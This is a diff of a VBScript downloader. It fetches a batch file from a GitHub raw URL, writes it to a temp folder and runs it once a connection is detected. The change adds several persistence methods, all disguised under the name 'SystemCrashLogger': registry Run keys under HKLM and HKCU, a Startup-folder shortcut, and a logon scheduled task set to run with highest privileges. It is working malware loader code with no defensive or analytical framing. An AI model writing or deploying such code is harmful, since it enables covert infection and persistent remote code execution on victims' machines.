@@ -1,6 +1,6 @@
 ' Define the URL of the batch file and the temporary file location
 Dim objXMLHTTP, objFSO, objShell
-Dim tempFolder, tempBatFile, batchUrl, regKey
+Dim tempFolder, tempBatFile, batchUrl, regKeyHKLM, regKeyHKCU, startupShortcut, taskName
 
 batchUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/final-berlin.bat"
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
@@ -22,9 +22,9 @@ If objXMLHTTP.Status = 200 Then
     objFile.Write objXMLHTTP.ResponseText
     objFile.Close
 
-    ' Add to Windows Startup (Runs on system startup with priority)
-    regKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemCrashLogger"
-    objShell.RegWrite regKey, "wscript.exe """ & WScript.ScriptFullName & """", "REG_SZ"
+    ' Persistence Mechanisms
+    Call AddToStartup(tempBatFile)
+    Call AddToTaskScheduler(tempBatFile)
 
     ' Wait for Internet Connection before running the batch file
     Do
@@ -38,11 +38,45 @@ If objXMLHTTP.Status = 200 Then
         Next
         WScript.Sleep 5000 ' Check every 5 seconds
     Loop
-Else
-    ' Optionally handle download failure
 End If
 
-' Clean up
+' Cleanup
 Set objXMLHTTP = Nothing
 Set objFSO = Nothing
 Set objShell = Nothing
+
+' Function to add script to Windows startup
+Sub AddToStartup(scriptPath)
+    Dim regKeyHKLM, regKeyHKCU, startupFolder, shortcut
+    regKeyHKLM = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemCrashLogger"
+    regKeyHKCU = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemCrashLogger"
+
+    ' Add to HKLM (requires admin)
+    On Error Resume Next
+    objShell.RegWrite regKeyHKLM, "wscript.exe """ & scriptPath & """", "REG_SZ"
+
+    ' Add to HKCU (works without admin)
+    objShell.RegWrite regKeyHKCU, "wscript.exe """ & scriptPath & """", "REG_SZ"
+    On Error GoTo 0
+
+    ' Add to Startup Folder
+    startupFolder = objShell.SpecialFolders("Startup") & "\SystemCrashLogger.lnk"
+    Set shortcut = objShell.CreateShortcut(startupFolder)
+    shortcut.TargetPath = "wscript.exe"
+    shortcut.Arguments = """" & scriptPath & """"
+    shortcut.WorkingDirectory = tempFolder
+    shortcut.Save
+End Sub
+
+' Function to create a scheduled task
+Sub AddToTaskScheduler(scriptPath)
+    Dim taskCommand, taskName
+    taskName = "SystemCrashLogger"
+
+    ' Remove any existing task
+    objShell.Run "schtasks /delete /tn """ & taskName & """ /f", 0, True
+
+    ' Create a new scheduled task
+    taskCommand = "schtasks /create /tn """ & taskName & """ /tr ""wscript.exe " & scriptPath & """ /sc onlogon /rl highest /f"
+    objShell.Run taskCommand, 0, True
+End Sub
